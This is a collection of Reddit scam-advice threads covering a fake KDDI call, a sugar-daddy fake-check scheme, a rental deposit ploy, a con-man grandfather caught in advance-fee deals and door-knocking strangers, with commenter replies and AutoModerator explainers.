- Yeah that's super cool of her, and awesome work to you verifying :)

Title: Potential scam call - Did I do the right thing?
Body: I‚Äôve lived in Japan for 7 years and have been fortunate to avoid scam calls up until now. I literally just hung up with an automated caller that claimed to be KDDI which is the entity in charge of AU, a cell phone company here. I have never had any kind of contract with AU ever. The machine said that my cell service was going to be cut off in 2 hours and at that point I just hung up the phone. I‚Äôm pretty sure I did the right thing since I know for a fact KDDI sends paper notices (which I haven‚Äôt received) and also I‚Äôve never contracted with them. I‚Äôm sure it would‚Äôve asked me to transfer money to keep my service or something. But there‚Äôs still that nagging paranoia in the back of my mind saying ‚Äúwhat if‚Äù. 
Did I do the right thing by hanging up? And are there any steps I should take in the future to reduce the chances of more scam calls?

- You did the right thing.

Hanging up is always the right thing :)
- If in doubt for any reason in a situation such as this you should hang up. Find the number for their customer service that you know for certain is legit and call it. If there's something wrong with your account they'll know. You can then proceed knowing you're in contact with a legitimate CSR.
- Yeah you'd get snail mail of the late missing payment to your address. It's usually in in red font/warning you so you can't miss it. It sounds like spam/scam preying on ppl that have AU accounts.

Edit: if you don't have a contract with them then it's deffo spam. If you want confirmation then hit up your service provider (SoftBank or¬† Docomo etc) to confirm your account is in good standing

Title: Received a random case of V8 juice?

There was a mysterious box with my boyfriend‚Äôs name, half of our address HAND written on the box (just street name and apartment order) and inside was a box of V8 juice. 

We have asked everyone we know if they sent it, no one did. 

We also realized that yesterday, a different item was supposed to get delivered through Amazon, it says it did, but it never turned up. Could the V8 juice be what came in lieu of the item we actually bought?

Title: Sugar daddy or scam?
Body: This supposed sugar daddy offered to take care of me by paying off my debts and giving me an allowance of 1500 dollars weekly.

They gave me a routing number and account number to pay off my credit card and emailed me a check to deposit into my checking account., and both worked.

 While both the payment on the card and the deposit were both pending, my available credit changed, and 500 dollars from the deposited check was immediately available. 

Well then they asked me to transfer the 500 to my  cashapp to give to a charity they support.. so I'm really thinking it's not legit now, more than I already did..

 So I didn't send the 500 anywhere and stopped responding to the "sugar daddy" and planned on talking to my banks about it today but...

Today when I checked my bank apps both pending transactions cleared. The rest of the 1500 dollar check is in my checking account and my credit card balance shows now the payment was made.

Once they started asking me to transfer the money and send it to someone through cashapp I figured it's a scam and the check would bounce and my credit would go back to what it was,  but it all cleared.

So is it a scam? Should I report it to my banks? Should I send the 500 dollars to this cash app charity lol?

- You stole money from the account of a victim. You committed wire fraud. That is a felony. You could go to prison. Block all contact with this scammer and do not talk to the police without a criminal defense attorney. You may be in a shit load of trouble here.
- Not cleared. Banks have to make funds available to the individual within a certain time frame. When that check goes through the clearing house it will then be identified as stolen or from a hijacked/stolen account. This can take up to two months. These funds will be taken from your account. Report it to your bank immediately. !sugar
- No one but NO ONE is giving away money as a suger daddy to a sugar baby. It's always a scam, usually from scammers who need a legit bank account (in this case, yours) to launder funds. Money laundering is a federal offense and can land you in jail. Get a legit job and don't fall for b.s. like this.
- This is the !sugar scam (read the autoreply to me for more info)

The bank information he gave you was stolen and the check was fake. The way the bank works is that they will, by law, allow you access to the money before it's actually been verified to be legitimate. Once the bank does verify the check and realize it's fake, they will take the money they gave you back. That's why he wanted you to send some of it back right away, so he can make off with it before the bank takes it. Once the real owner of the stolen account realizes you used their money to pay your credit cards, the payment will be reversed.

Both the stolen bank information and the fake check will cause you trouble and maybe not just with your bank.

**Never accept free money from random strangers on the internet.** Just because they claim to be sending you money, doesn't mean you are safe from being scammed.
- The check is fake - it *will* bounce eventually. The bank fronted you the money on the assumption that the check was good - they will take back that money when the check inevitably bounces.

The routing and account number came from a stolen account. The scammer used you to do money laundering for him. There is a chance the cops will come looking for you soon enough. Remember rule \#1 - never, *ever* talk to the cops without an attorney present. This is important.

Here's what you need to do now:

First, call your bank's fraud department right now and tell them you were duped into depositing a fake check. Be brutally honest about everything. There is a very high chance that your bank will close your account when the check bounces. You *might* be able to avoid that if you come clean before the fraud is discovered.

Second, make sure there is enough money in the account to cover the check plus the returned check fee the bank will charge you (usually $35 to $50). You don't want your account to go negative, because then they will charge you an overdraft fee as well. The money you got from the stolen account might also be pulled back, so factor that in as well.

Finally, be prepared for the scammer to go apeshit on your ass. They will accuse you of having stolen their money and make all sorts of threats. They *will* threaten to come to your home and kill everyone they can find. Just know that it's all a bluff - they can't do anything to you. Just keep blocking all their numbers. Do not respond in any way, do not engage, and definitely do not send any money. Just keep blocking until they give up.

Good luck.
- Repeat: there is no such thing as an online sugar daddy, it is always a scam. You are not that special.
- r/scams.....50% "I was greedy", 40% "I was horny", and 10% "I was clueless".
- Scam, and you are an accomplice now.
- Get a lawyer...NOW. A local dude just caught federal charges for doing the same thing you've done. Its wire fraud and the feds are coming down HARD on it.
- Lawyer up.  You‚Äôve been used to launder money, and the law does not care that you were tricked into it.
- They likely provided you an account number they got off the dark web or scammed off of someone. The payment will be disputed by the real account owner and your account will be flagged for fraudulent activity. If they‚Äôre familiar with CashApp, why didn‚Äôt they CashApp you the money instead of emailing a check? Why don‚Äôt they just mail a check to their charity? Scam scammy scam.
- This is likely considered check fraud. While there are legitimate ways a company can pay an employee using an e-check, emailing an image of a check to someone is not a legal use of an e-check.

The check (and the credit card payment) are likely to be reversed in the next few days to weeks.
- This comes up frequently. Search the sub for "Sugar" and you'll find hundreds, if not thousands of similar cases.

As is usually pointed out, "Sugar" is sex work. Nobody is giving away 75k+ per year just to be platonic pen pals.

Bluntly, if you're not fucking someone, in the flesh, it's not Sugar, and if you're taking thousands of dollars from someone who sells it that way, you are being scammed.

So, you are a victim here, and being used, but also a perpetrator of a crime. And the law doesn't necessarily give a shit whether you have 5 jobs or not. People with 5 jobs can still commit crimes, and ignorance of the law is rarely (in my not-a-lawyer experience) a valid defense.

- Scam
- Hi /u/erkevin, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- Thank you this comment has been the most helpful yet. Taking your advice and heading to my banks now.

Short version: https://m.youtube.com/watch?v=uqo5RYOp4nQ
- Can't I tell the banks to reverse the transactions?
- Aw, nuts, I have big tits and am an excellent conversationalist. Back to cleaning toilets, I guess.
- #Sorry, I only pay $50,000 for ass.

But those scintillating conversations sound magnificent. And I don‚Äôt even know what scintillating means!!
- What are your 5 jobs?
- Just make sure you talk to the bank manager or someone from the fraud department. The regular customer service doesn't always know how to handle bad checks, and we have had reports here of them giving bad advice. Make sure you talk to someone who knows what's going on.
- "Clueless" has about a 100% overlap
- So nice.. But thats only 90% so who is DUMB?
- It's not that simple
- If we could just get us one of those online sugar daddies!
- Hahahaha! I like you!
- Five task scams.
- Man I hate when people say that shit. 5 jobs my ass. Yeah, 5 jobs that give you 5-10 hours a week. Ain‚Äôt enough time to even be on Reddit or sleep if you had 5 actual jobs.
- Waiter at Italian restaurant where I usually work 20-30 hrs a week.

Box office at two music venues mainly on weekends usually 12-18 hours a week.

For a local production company I work harm reduction every few weeks.

And for a separate larger production company I do harm reduction as well every few months depending on event locations. So usually just a couple events a year with this company.

But still all are jobs.
- There's still the 10% for clueless. 40+30+20+10=100%
- You sure because I went to the bank and talked with the fraud department over the phone and refunding the payment was the first option she gave me.
- Do, you are unemployed and actively getting scammed. Got it. 

If you want a real job, go down to Walmart of McDonalds and apply. A real job would fix many of your issues.

Edit: Sorry, man. I thought you were the Op. :-P
- I figured it was bullshit. There literally aren't enough hours in the day.
- The production companies I work for are very infrequent yes but I work on average 35-40 hours a week as a waiter and box office on weekends. I work hard. Just because I don't work a 9-5 job doesn't mean my jobs aren't "actual jobs" and I'm sure my managers and the people I work for would agree they are very real jobs. I can send you my work schedules so you can calculate how much sleep I get later.
- Yes, these are very much real jobs, though 2 are infrequent. If you are working 32-48 hours regularly, but not being able to afford Healthcare (many people in the States can't, unfortunately), your only real alternative is getting higher-paying jobs. 

Either way, there is no magical internet rando that is going to give you free money.
- Any other repercussions mentioned?
- Ha, thanks for the edit, that was confusing.
- Yeah reminds me of this dude when the hurricanes came. ‚ÄúI cant afford this. I work 4-5 jobs and my wife works 2-3.‚Äù

Like dude, no yall aint. Even if yall could if there were enough hours in the week, you should be raking in money from that many jobs.
- I‚Äôm not saying you aren‚Äôt working hard, but I see too many of these ‚ÄúI work 4 jobs, 5 jobs, 3 jobs‚Äù when it just isn‚Äôt possible. I‚Äôm a plumber. I work on multiple jobs myself. A few residential homes, a pool, a commercial building, etc. i cant say I work 5 jobs when I only work 1.

Also, working two jobs that are <20 hours a week each is barely one job. While you‚Äôre ofc working hard, you are only working one job like everyone else but making it sound like you‚Äôre putting in 80-120+ hours a week in multiple jobs.

Nothing serious, it‚Äôs just a pet peeve of mine. Regardless, I‚Äôm sorry for the scam. I can understand the struggle.
- Seriously the only reason I got more than one job is because my first job literally told me they won't schedule me more than a certain number of hours just so they don't have to provide me Healthcare.
- No they just said my balance would return to what it was and I asked if the fbi or police are gonna show up at my door but they said if anything I would just have to provide the information for a police report
- Sorry. I had a stupid moment. :-P
- True and I get how its a pet peeve. I said it not to sound like I'm putting in 80+ hrs a week  at different jobs but because the commentor told me to "get a real job". Sure I could have said "I have a real job" but for them to assume I don't have a job because of this scam peeved me so I had to let them know I have more than a real job I have five real jobs. And thank you appreciate your sentiment.
- That is unfortunately bet common and it's bullshit. The only way to bypass tta is to get one fulltime, but that can be difficult, depending on the field.
- Which - for other readers - is why you get out ahead of it instead of just waiting to see what happens.  You want to establish you're the victim not somebody purposefully pushing a bad check.

- Yes, scam. Any training or clearances or such that are required for a job would be paid by the employer. In rare cases, they'd put you on probation to ensure they don't waste their money for training/fees, and require you to pay back if you quit before the time period, but you would NEVER be required to pay yourself.

Never pay your own money to get paid. 

!job scam of some type. Or potentially a !task scam. But yeah, scam.
- You never pay to work.  If they actually want you for a legitimate job, THEY would pay for any training.

Also ***unsolicited invites*** to do an online interview are always scams, particularly if they‚Äôre just text interviews, and especially if they‚Äôre on platforms like Telegram or other social media.

Just remember, you ***NEVER*** pay to work‚Ä¶

I would suggest blocking and moving on.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: I believe I was scammed on eBay
Body: Ok, so I‚Äôm not tech savvy, and I‚Äôm definitely naive and trusting. I purchased a used iPhone 11 Pro Max 512gb in April 2024. Everything was fine when I received it. I replaced the batteries and fixed the glass backing and It worked perfectly after this. Yesterday, I noticed that my storage was completely full (9 months later). I checked my storage and it‚Äôs only 65GB. (I had never checked this previously.) when I found out, I tried to contact the seller. I‚Äôm not even sure if their account is active, but I doubt Il get a response. I then tried to open a case on PayPal. They closed it immediately as it was no longer eligible for PayPal buyers protection. Ebay won‚Äôt step in either, since too much time has passed. I just feel so stupid that I overlooked this detail and I skewed myself over since it‚Äôs no longer under buyers protection. There‚Äôs a huge difference in 65GB and 512GB and I truly believe that the seller intentionally did this. Is there anything I can do about this?

- Is it 65? There is only 64gb.

But yeah can‚Äôt do anything. Does it work fine like a normal iphone? There are a good bit of fakes out there.
- Its probably one of those cheap android clones that they jury rig to work with apple.


Sadly, not much you can do now

Title: Pregnancy Phone Call Scam?
Body: About 3 years ago, I got a voicemail from a woman who sounded really distressed, saying she was pregnant and she said my name. It was from a "No Caller ID" number, so I couldn‚Äôt track who it was. I contacted all the girls I could think of, but none of them said they called me.

What really bugs me is how realistic the voicemail sounded. I can‚Äôt shake the feeling that I missed someone or that it wasn‚Äôt a prank. Could this possibly be just a malicious scam? Has anyone else received something like this? Any advice on how to ease my mind?

Thanks.

- Anyone that has information like your number is capable of searching for pretty much all your details now with the people finder sites. Name, emails, family, address, work history - it's all easy to find. 

Likely just a prank since there was no followup to scam you out of money. But be aware your info is easily findable and act accordingly.
- Thank you for the response.  Do you think the possibility of this being legitimate seems very unlikely? I feel like if it was a real situation I definitely would have heard more by now or would not have been dialed as "No caller id".

Title: Possible Rental Scam: Met "tenant" at apartment. They want damage deposit given to them, not landlord
Body: I'm looking to rent a room in a house or apartment. I found an ad on Craigslist, followed up and met four people at the apartment. They gave me a tour, which included the empty room that I would be renting. The apartment is fully furnished (except for that room), with food in the fridge, etc. All four people that I met claim to live there.

As normal as all of that sounds, I'm concerned because of how they want to handle the deposit. They want me to send a $300 deposit and a $40 processing fee to one of the tenants, not to the leasing office of the apartment complex. The deposit would be held in that tenant's bank account, to be repaid when I move out.

All four of them affirmed that it works that way for them.

I asked why they do it that way, and they didn't give me a straight answer. Basically they claimed that the first tenant to move into the apartment paid the full deposit to the landlord, and that that deposit will not be repaid until the final tenant moves out and the apartment is vacated completely.

Is this a known scam?

- Sounds like they're trying to sneak in a sublet and you'd have no legal/protection if you proceeded. You wouldn't be on the lease, your money/deposit would not be protected, and they would be able to screw you over at any point in time.
- I would suggest to contact the leasing office, and ask them about it.

  
they are trying to sublease a tenant, with you paying the brunt of the money that it would cost.

  
I guess the apartment might not even cost more than 350$ a month. so you would be the one paying most of it.
- The landlord know nothing about the new tenant. Even if the one person on the paperwork can sublet, if they ever stop paying there is nothing you can do.
- It does sound that way. Their counterclaim is that I would meet with them in the apartment leasing office, and all five of us would sign documents to formally add me to the lease.

But it still seems strange to me. Suppose I give my deposit to tenant "Jake." The money will be held in Jake's bank account.

I move in, and in a year or two years, Jake develops a gambling addiction, or his bank account is seized for back taxes, or in some other way Jake's accounts are cleaned out. As far as I can tell, I have no legal recourse to recover my money.

This obviously seems like a bad bet for me, but all of them treat it as the most natural thing in the world. This is part of why I suspect a scam.
- Meet them at the leasing office first. If they say they need the deposit first, there's your answer.

Title: Grandpa is both a scammer and a scam victim.
Body: I'm making this post to ask if anyone is familiar with the scam that is victimizing my Grandpa, and to ask for advice about how my family can convince my Grandpa to stop engaging with this scam for once and for all. As far as we know he is not sending them money, and how he gets away with that is a bit funny, but it's driving everyone CRAZY because it's all he ever talks about, for more than a DECADE.

A little background about my Grandpa, he himself is quite the scammer. A regular con man, a liar, but thankfully he doesn't mess around with his family. He gets away with stealing money from people because he is a smooth talker, and his victims are old, gullible churchgoers. He will absolutely screw over random people he meets at church. He'll convince them to give him money, promises that he's going to invest the funds into some amazing opportunity, and he'll then pay them back handsomely. He, of course, basically just uses that money to live his life, pay bills and such. But he sometimes would splurge on a special treat like a little trip or a nice dinner to keep his wife happy to serve him, and, more importantly, stay his blind follower who truly believes that he is a brilliant businessman who is going to be a billionaire overnight. When he starts to get pestered by the person who he owes money to, he will dodge their calls, go to a different church, and start the whole scam again. 

One time a person gave him $12K to invest. Instead of using the money on any investment, he paid first month, last month, and deposit, on a MASSIVE house. It had to have been 8+ bedrooms. After he moved in, he did not have any money to pay the regular monthly rent. He essentially squatted there for a year, and was evicted, and then he and his wife had to move in with my mom, which she HATED. No one in my family knew how he was affording that house, and it was me who discovered, many years later, that he never once paid normal rent during the time he lived there. He would send emails to his landlord promising that his investments and deals were closing soon and he would pay him, and he just never did until the authorities got involved.

I'm not sure what is going on in his head when he blew that $12K on that house. It's probably a bit of two main things. One, that he genuinely believes in the investment scams, truly thinks that he really is going to be paid billions of dollars for the business deals that he's involved in and pay everybody back. Two, he needed to have something impressive to keep his wife happy and gullible, so that she would continue to take care of him and provide him labor and companionship.

  
More about the scam that he's involved in:

He is convinced he is a broker in a series of transfers and purchases of items he believes are worth trillions of dollars (yes, trillions) and when the purchases are finalized, he will get a 1-10% share of the purchase, so millions or billions of dollars. The purchases NEVER happen, he has NEVER gotten money from this activity. There is always some reason why it can't go through or needs to be indefinitely postponed. The buyers/sellers/etc. are all scammers who want my Grandpa to pay some fee for customs, or a bank fee, or something like this, and because my Grandpa has no money and fancies himself savvy negotiating business person, he never gives in to them and gives any of the money they're requesting, he'll send countless emails dodging the question and insisting that the deal can go on without his money. (Yes, I snooped through his emails and I have read a lot of them... it's so stupid, it genuinely makes me sad.) After the scammers realize they'll never get money from him, they make up excuses about why the deal is off. Someone dies, or the jewels get stolen, they make up something about a new law which forbids the sale, or something like that. But inevitably, another scammer comes along with a new asset to sell and he begins again. THIS HAS GONE ON FOR ALMOST 15 YEARS.

While we're thankful he hasn't lost money or, seemingly, given them info for identity theft, his obsession with these "deals" are not just annoying. He has wasted his life away on his laptop writing useless word-salad emails and talking in circles on the phone with random men in crazy time zones. He has alienated any friends he could have had. I had sympathy for him when I realized he was probably doing all of this to keep his wife, promising her a life of luxury and leisure and status. She was about 25 years younger than him and he needed her to stay with him, and she would get quite mad at him when they were broke in between him borrowing/stealing money from his church friends. She would also get extremely angry when they had to switch churches because of him not paying people back, she just wanted to have a normal church family that she could stay with long-term, and his scamming made that impossible. But, then his wife died, VERY SUDDENLY, of brain cancer. It was horrifying to watch. I never really liked her but it's so sad that she lived most of her life blindly serving a man who lied to her every single day. When she passed away, I thought Grandpa would realize the jig is up and he can't continue to lie to himself and others about these deals. He no longer had a wife to fool with his promises, so he could probably just relax and let my mom take care of him. But he keeps on with the allure of being a billionaire. I just don't get it. He's in his mid-80's and dementia is starting to take hold.

Once his wife died my mom was able to swoop into his life and fully take over a lot of his affairs. She got him on some government benefits and now he has reliable, fixed, though very modest income. He drives for Uber, which is good for him because it keeps him off the computer and provides him with a little extra spending money. I wish he would accept his calm, elderly life. I think he is starting to think about his own mortality and feels deep shame for a number of reasons. He is deeply religious and is extremely concerned that he isn't going to go to heaven to be with his wife, probably regrets scamming people out of so much money. And at the same time he feels deep shame because he was never legitimately rich and maybe realizes that he wasted a lot of his time and last healthy years of his life on these stupid scams.

It's basically just a joke in my family now, "Grandpa and his deals" -- because every time anyone talks to him, he will bring up whatever his deal-of-the-moment is. Last time I was around him it was a golden camel statue that was worth 100 trillion dollars. 

He has to spend the summer in Canada for medical reasons and he won't be allowed to drive for Uber while there, so we're worried he will spend more time on his laptop engaging with these people. I wish there was a way we could make him stop. He's made a couple of really stupid purchases online in the past few months and has had to replace his debit card a few times. He would absolutely lose his mind and have a huge meltdown if we took away his control of his money. Money is EVERYTHING to him.

- I‚Äôm not understanding why your grandpa isn‚Äôt in jail yet.
- You are happy that a 85 year old is driving Uber? This is nuts. He is going to kill someone, or himself. He should not be driving a car, and even less a paying customer.
- Wait...he's a mid-80s man who's already showing signs of dementia...

And he's driving for Uber?

Cool story, bro.
- Did chatGPT write this
- >Money is EVERYTHING to him.

And it sounds like he is soon to have none.
- He deserves it. Walk him into it deeper.
- He seems like a not so nice guy who is facing karma.  Hard to have sympathy for a guy who has been tricking people for personal gain for the duration of his life.

You're obviously not going to be able to convince him it's a scam.  He may have already figured it out but the shame and embarrassment of admitting it is keeping him involved.

Stop giving him money.  Don't buy him groceries.  Don't pay his utility bills.  If you do, he's just scamming you.
- I think you‚Äôre missing the fact that Grandpa‚Äôs scamming was never really about the wife at all. He did it for his own ego, and the ego is what‚Äôs keeping him from accepting support managing¬†his money.
- If you want him to stop, why don‚Äôt you just take all the evidence you have to authorities and turn him in? 

That way he can‚Äôt scam/defraud anyone else, and he won‚Äôt be able to talk to scammers online.
- Narcissistic jerks make the very best marks.
- In my mind's eye , as I read your story,  your grandpa is Jerry Lundergaard (William H Macy) from Fargo.

Sorry, no advice., Your grandpa is a loser and really it is too late in his life to meaningfully change that. Hopefully your mom gets full POA on him soon and can limit his access to his own funds.  At some point a man with dementia will start to be outsmarted by the other scammers.
- Seems like a horrible person tbf
- If dementia is starting to take hold, you should look into getting him tested relatively regularly so you may be able to get power of attorney or guardianship. 

What type of scam is this? Generally doesn‚Äôt sound anymore complicated than the ‚ÄúNigerian prince‚Äù type deals from decades past. Gold bars, oil fields, etc etc all fake. !advancefee 

I wouldn‚Äôt drive myself crazy over a scamming old man. He may just have to reap what he‚Äôs sowed. That‚Äôs not your fault.
- Look, I don't know how hard you want to try since this sounds like karma. But if your conscious is nagging you, you can try to explain it to him in a relatable way. "Hey grandpa, you know how you used to scam people? Yeah, now you're the scammee." Generally speaking, people like your grandpa believe they're smarter than everyone else. So likely to him he thinks he's too smart to be scammed.
- Sounds like payback. Let him be scammed, he deserves it.
- People like your grandfather are the nicest most honest looking people on the earth it is how they get away with it all. He‚Äôs not going to heaven he‚Äôs not going to see his wife. At this point it‚Äôs a job to him. There‚Äôs no reversal. How your family let him keep doing this decades is disturbing at best.
- He‚Äôs NOT religious nor does he give a sh^t about anyone. Just a grifter at best
- You reap what you sow. I'll grab a bag of popcorn and watch karma bites him hard in the s.
- I stopped reading at "he's deeply religious." There's only so much naked hypocrisy I can take in one go (not yours, OP).
- Maybe it‚Äôs karma getting him back with him being scammed lol.
- At least he's wasting the time of the scammers who are trying to scam him.
- Sit down with your grandpa and help him write his memoirs. People would buy the book, he will make honest money for the first time in his life, and maybe become famous.
- Can you contact the pastor of his current church and tell him this story?
- Yeah, I'm not sure why he's apparently not been reported to the police. it shouldn't be that hard to find him if he's just changing churches and doing it again and again.
- He may have been recently pardoned‚Ä¶
- Because OP and their family don't care about the people getting scammed, but now it's a problem because grandpa is the victim.
- Fr an 85 y/o w dementia starting to set in lmao. Bros gonna take care of this whole problem himself if you leave him behind the wheel
- It's hard to feel much compassion for him. I hope the family is taking steps to insulate themselves from his mess.
- Nobody is going to take a 85 year old non-violent criminal to court or jail. They much prefer his old age not being their problem.
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- I kind of want to hear from the mom. ¬†What was it like growing up with a dad like this, was it expected or encouraged for her to do similar things, what kind of values did he instill in her?
- From my church going relatives, there is a real blindness when another church member is involved. I have brought up concerns about certain people and the first (and only answer sometimes) is but they are a church member... üôèüôèüôè So I can see people unwilling to press charges.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/IHaveBoxerDogs, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Why does a person come knocking on our door asking if we are renting or selling our house?
Body: A man in his 20s-30s rings our doorbell and asked if we have houses in the community for rent/sale.

First, he said he saw a sign about a house rental. We said no, don‚Äôt know anything about that. When we asked where he saw the sign, he said his friend saw it 2-3 months ago and that he didn‚Äôt actually see it.

He then asks if they‚Äôre for sale. We said no. Then he asked how much these houses cost. At this point, we‚Äôre confused why he is going from renting to buying.

Who goes around knocking on doors about a rental especially in a residential community?

- Who answers questions from strangers trespassing?  My only response would be, "leave now."
- Who answerers their door to strangers?
- Looking to see if you have cameras and a security system how many live there, have a dog, how easy to steal from maybe?


People can go on Trulia or Zillow to see homes to rent and property values.


Poor fake excuse to go knocking on doors.


(I do have to add though that when the real estate market is hot that people & real estate agents do go and put flyers on doors or in mailboxes to contact them if you are interested in selling your house to get a jump on the competition.)
- That's how my parents bought their summer place. They loved the street and started talking with neighbors. One lady told them about an older couple who were planning to sell. My parents went to see them, talk for some time and left them their number. A week or two later they called back with a their price. (They were pretty happy to save the realtor's fee)

So you don't have to answer his questions or even answer the door but it could be something like that. Or he's a new realtor and he's looking for clients.
- Sounds like he's casing the neighborhood for a future operation - high value houses usually have high value goods inside them
- I live in a very hot real estate area. I have real estate agents knocking at my door, leaving offers, sending me mail, etc several times per month, even though I tell them I'll never sell.

It's not illegal, but their whole business is a scam.  If they sell a house for $3M, they'll get $180K. Of course they have to share it with their cohorts, but there's no way they deserve that kind of income. Put a few ads in the papers, show a few people through, and collect a windfall.

A real estate attorney would probably charge $10K to do all the paperwork, and even he is just doing a copy/paste/print job.

Not all scams are illegal!
- Could be scoping for cameras, dogs, how many grown men live in the house. Thieves.
- ok im all for exposing scams but a lot of the people in this sub sound like completely paranoid weirdos lol "never answer your door, no matter what?" how did u guys survive pre-internet?

just letting you know that "door knocking" or "canvassing" is a very common practice for new real estate agents who are trying to get a foot in the door (no pun intended) and get experience with the market and neighborhoods etc. they want to see home values, build rapport, get their face and name out etc. i have them all the time leaving me cards. i have friends who work in the industry as well its very normal. i even get hand written letters and flyers taped to my door all the time when im not home, even in my mailbox. its most common in residential areas that are middle class (not super high end rich, but not low end either)....these are often first time home buyer areas and have a high turnover, great areas for first time real estate agents.

u guys need to get out more and touch some grass. my god
- As far as I am concerned, these are efforts to size up the occupants and security of the house.  After all, in 'Murica you might wind up with a shotgun rifled slug in the chest if you pick the wrong house to burglarize,
- This could be someone who tried to rent/buy your house from a scammer. They showed up assuming you were renting/selling based off of whatever the scammer they talked to said. It's a fairly common scam.
- Yes, more than likely real estate related. The person is trying to find houses off market  before anyone else.
- When my aunt died, my mom was the executor. The normal texts, calls started coming in about buying my aunt's house. Actually had two show up at my mom's door. Luckily I was staying there told them she wasn't there and asked what they needed. Said they wanted to make an offer on the house. I told them we would think about selling, but needed a few weeks, could I get a business card. After they gave me one, I read the name back and told them they wouldn't be buying any f$&ing thing and to get the f&#k off the property. They looked shocked at how quick my demeanor could change. Military tricks come in handy.

Left a review on Google or Yelp or places about how they were chasing obituaries or probate cases around to make some money.

I can see the phone messages or text although tasteless, but showing up at the door was a new low for me.
